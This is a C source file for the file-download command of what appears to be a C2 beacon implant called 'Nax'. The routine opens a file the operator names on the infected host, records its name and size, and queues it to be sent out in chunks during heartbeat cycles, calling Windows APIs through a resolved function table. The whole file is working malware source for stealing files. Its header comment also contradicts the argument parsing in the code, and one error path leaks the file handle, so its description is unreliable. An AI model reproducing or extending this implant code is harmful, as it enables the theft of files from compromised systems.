/* beacon/src/Commands/Download.c
 * CMD_DOWNLOAD (0x22) - initiate a chunked file download.
 *
 * Opens the file, registers a NAX_DOWNLOAD node, and returns the START
 * result.  Subsequent chunks are sent by NaxProcessDownloads() in the
 * heartbeat relay phase (one chunk per sleep cycle).
 *
 * Task args: file_path (plain byte string, no length prefix).
 *
 * START result:
 *   [NAX_DL_START(1)][fileId(4LE)][fileSize(4LE)][fname_len(4LE)][fname]
 *
 * Failure result:
 *   [Win32_error(4LE)]   (status=ERR, data_len=4) */

#include "Nax.h"

FUNC INT NaxCmdDownload( PNAX_INSTANCE Nax,
                         UINT32        taskId,
                         const PBYTE   args,
                         UINT32        args_len,
                         PBYTE         out,
                         UINT32*       out_len ) {
    if ( !args || args_len < 4 ) return NAX_ERR_INVAL;

    /* First 4 bytes: per-download chunk size override (0 = use global) */
    UINT32 dlChunkSize = NaxR32( args );
    PBYTE  pathArgs    = (PBYTE)args + 4;
    UINT32 pathLen     = args_len - 4;

    /* Build null-terminated path */
    PCHAR path_buf = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, pathLen + 1 );
    if ( !path_buf ) return NAX_ERR_NOMEM;
    MmCopy( path_buf, pathArgs, pathLen );
    path_buf[ pathLen ] = '\0';

    /* Open file */
    HANDLE hFile = Nax->Kernel32.CreateFileA( path_buf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
    if ( hFile == INVALID_HANDLE_VALUE ) {
        DWORD err = Nax->Kernel32.GetLastError ? Nax->Kernel32.GetLastError() : 0;
        NaxWriteWin32ErrCode( out, out_len, err );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, path_buf );
        return NAX_ERR_FAIL;
    }

    /* File size */
    DWORD fsize_hi = 0;
    DWORD fsize_lo = Nax->Kernel32.GetFileSize( hFile, &fsize_hi );
    if ( fsize_lo == (DWORD)( -1 ) || fsize_hi > 0 ) {
        DWORD err = Nax->Kernel32.GetLastError ? Nax->Kernel32.GetLastError() : 0;
        NaxWriteWin32ErrCode( out, out_len, err );
        Nax->Kernel32.CloseHandle( hFile );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, path_buf );
        return NAX_ERR_FAIL;
    }
    UINT32 fsize = (UINT32)fsize_lo;

    /* Basename */
    PCHAR fname = path_buf;
    for ( UINT32 i = 0; path_buf[i]; i++ )
        if ( path_buf[i] == '\\' || path_buf[i] == '/' )
            fname = path_buf + i + 1;
    UINT32 fname_len = NaxStrLen( fname );

    /* Generate random fileId */
    UINT32 fileId = 0;
    Nax->Bcrypt.BCryptGenRandom( NULL, (PBYTE)&fileId, 4, BCRYPT_USE_SYSTEM_PREFERRED_RNG );

    /* Allocate download node */
    NAX_DOWNLOAD* dl = (NAX_DOWNLOAD*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, sizeof( NAX_DOWNLOAD ) );
    if ( !dl ) {
        Nax->Kernel32.CloseHandle( hFile );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, path_buf );
        return NAX_ERR_NOMEM;
    }
    dl->TaskId    = taskId;
    dl->FileId    = fileId;
    dl->hFile     = hFile;
    dl->FileSize  = fsize;
    dl->Index     = 0;
    dl->ChunkSize = dlChunkSize;
    dl->Next      = Nax->DownloadHead;
    Nax->DownloadHead = dl;

    /* Build START result: [sub(1)][fileId(4LE)][fileSize(4LE)][fname_len(4LE)][fname] */
    UINT32 result_sz = 1u + 4u + 4u + 4u + fname_len;
    if ( result_sz > *out_len ) {
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, path_buf );
        return NAX_ERR_NOMEM;
    }

    PBYTE p = out;
    *p++ = NAX_DL_START;
    NaxW32( p, fileId );    p += 4;
    NaxW32( p, fsize );     p += 4;
    NaxW32( p, fname_len ); p += 4;
    if ( fname_len ) { MmCopy( p, fname, fname_len ); p += fname_len; }

    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, path_buf );

    *out_len = result_sz;
    return NAX_OK;
}
